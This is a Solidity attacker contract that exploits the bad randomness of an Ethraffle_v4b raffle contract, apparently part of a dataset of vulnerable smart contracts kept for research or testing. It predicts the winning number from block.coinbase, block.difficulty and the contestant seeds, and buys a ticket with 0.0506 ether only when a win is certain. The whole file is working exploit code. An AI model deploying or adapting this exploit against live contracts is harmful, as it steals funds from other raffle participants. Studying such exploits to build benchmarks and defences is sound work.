pragma solidity ^0.4.16;

import "../dataset/bad_randomness/etheraffle.sol";
contract EthraffleV4bAttacker {
    Ethraffle_v4b target;
    uint256 constant TOTAL_TICKETS = 50;
    mapping(uint256 => address) contestants;

    function EthraffleV4bAttacker(address _target) public {
        target = Ethraffle_v4b(_target);
    }

    function setContestant(uint256 number, address contestant) public {
        contestants[number] = contestant;
    }

    function setContestants(address contestant) public {
        for (uint256 i = 0; i < TOTAL_TICKETS - 1; i++) {
            contestants[i] = contestant;
        }
    }

    function chooseWinner() public returns (uint256) {
        address seed1 = contestants[uint256(block.coinbase) % TOTAL_TICKETS];
        address seed2 = contestants[uint256(address(this)) % TOTAL_TICKETS];
        uint256 seed3 = block.difficulty;
        bytes32 randHash = keccak256(seed1, seed2, seed3);
        uint256 winningNumber = uint256(randHash) % TOTAL_TICKETS;
        return winningNumber;
    }

    function attack() public payable returns (bool) {
        uint256 winningNumber = chooseWinner();
        if (winningNumber == TOTAL_TICKETS - 1) {
            target.buyTickets.value(0.0506 ether)();
            return true;
        }
        return false;
    }

    function() public payable {}
}
